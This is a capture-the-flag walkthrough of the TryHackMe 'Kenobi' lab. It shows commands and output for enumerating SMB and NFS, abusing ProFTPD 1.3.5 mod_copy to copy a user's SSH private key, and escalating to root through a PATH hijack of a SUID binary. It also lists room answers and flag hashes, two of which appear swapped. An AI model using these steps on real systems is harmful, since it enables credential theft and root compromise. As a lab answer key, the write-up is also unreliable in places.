# <div align="center">[kenobi](https://tryhackme.com/r/room/kenobi)</div>
<div align="center">
<img src="https://github.com/user-attachments/assets/87cc5aeb-1a06-43b3-93fe-9533cd3f9402" height="270"></img>
</div>


## Task 1. Deploy the vulnerable machine

<div align="center">
<img src="https://i.imgur.com/OcA2KrK.gif" height="200"></img>
</div>

This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.
Answer the questions below

### Scan the machine with nmap, how many ports are open?
```
7
```
## Task 2.Enumerating

<div align="center">
<img src="https://i.imgur.com/O8S93Kr.png" height="200" width=300"></img>
</div>

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

### Using the nmap command above, how many shares have been found?
```
3
```
### Once you're connected, list the files on the share. What is the file can you see?
```
log.txt
```
### What port is FTP running on?
```
21
```
### What mount can we see?
```
/var
```
## Task 3. Gain initial access with ProFtpd

<div align="center">
<img src="https://i.imgur.com/L54MBzX.png" height=""></img>
</div>

### What is the version?
```
1.3.5
```
### How many exploits are there for the ProFTPd running?
```
4
```
### What is Kenobi's user flag (/home/kenobi/user.txt)?
```
d0b0f3f53b6caa532a83915e19224899
```
## Task 4. Privilege Escalation with Path Variable Manipulation
### What file looks particularly out of the ordinary? 
```
3
```
### Run the binary, how many options appear?
```
/usr/bin/menu
```
### What is the root flag (/root/root.txt)?
```
177b3cd8562289f37382721c28381f02
```
# Let start Scanning The Network

```
└─$ nmap 10.10.101.17 -sV -Pn                                                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 11:20 IST
Nmap scan report for 10.10.101.17
Host is up (0.21s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs         2-4 (RPC #100003)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.70 seconds

```
* #### Total 7 ports are open. 

#### As Smb is open let enumerate it using nmap,```nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse IP```
```
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.101.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 11:21 IST
Nmap scan report for 10.10.101.17
Host is up (0.19s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.101.17\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.101.17\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.101.17\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 31.42 seconds
```
* #### We have 3 share r listed here, let try to connect with anonymous share.
```
└─$ smbclient //10.10.101.17/anonymous
Password for [WORKGROUP\death]:
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Wed Sep  4 16:19:09 2019
  ..                                  D        0  Wed Sep  4 16:26:07 2019
  log.txt                             N    12237  Wed Sep  4 16:19:09 2019

		9204224 blocks of size 1024. 6877088 blocks available
```
* #### Here is a log.t, let download this to our system.
```
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (16.8 KiloBytes/sec) (average 16.8 KiloBytes/sec)
smb: \>  
```
* #### I attached a copy of [logs](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Kenobi/log.txt)
* #### After reading log.txt I found few interesting things.
* ##### Information generated for Kenobi when generating an SSH key for the user
* ##### Information about the ProFTPD server running on port 21.
#### Earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

```
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.101.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 11:21 IST
Nmap scan report for 10.10.101.17
Host is up (0.20s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836544.0  6877084.0  22%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 4.60 seconds
```
#### We can see a var mount here

### According to provided info, Let try banner grabbing to get ftp version.
```
└─$ nc 10.10.101.17 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.101.17]
```

### Let Search for any Exploit for this version.
```
└─$ searchsploit ProFTPD 1.3.5
--------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                             |  Path                          |
--------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                  | linux/remote/37262.rb          |
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                        | linux/remote/36803.py          |
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                    | linux/remote/49908.py          |
ProFTPd 1.3.5 - File Copy                                                  | linux/remote/36742.txt         |
--------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
### As i read about The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

### So just copy the ssh key to var
```
 nc 10.10.101.17 21
```
```
SITE CPFR /home/kenobi/.ssh/id_rsa
```
```
SITE CPTO /var/tmp/id_rsa
```
```
└─$ nc 10.10.101.17 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.101.17]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

### We knew that the /var directory was a mount, Lets mount the /var/tmp directory to our machine.
```
mkdir /mnt/kenobiNFS
```
```
mount 10.10.101.17:/var /mnt/kenobiNFS
```
```
ls -la /mnt/kenobiNFS
```
### If u get any error doing this just install ```showmount``` command and all it pkg will start downloading with it.
### Copy [id_rsa](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Kenobi/id_rsa.md)
```
cp /mnt/kenobiNFS/tmp/id_rsa .
```
### Change the permissions using chmod:
```
chmod 600 id_rsa
```
### Let log In using SSH
```
ssh kenobi@Ip -i id_rsa
```
```
└─# ssh kenobi@10.10.101.17 -i id_rsa 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 
```
## User Flag
```
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa532a83915e19224899
```
## Post Exploitation
```
find / -perm -u=s -type f 2>/dev/null
```
### This is odd
```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```
```
/usr/bin/menu
```
### Let run this
```
/usr/bin/menu
```
```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```
### We need to manipulating the path to gain a root shell as usual
```
cd /tmp
```
```
echo /bin/sh > curl
```
```
chmod 777 curl
```
```
export PATH=/tmp:$PATH
```
```
/usr/bin/menu
```
```
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# 
```

## Root Flag
```
# cat /root/root.txt
177b3cd8562289f37382721c28381f02
```

Done !!🙂
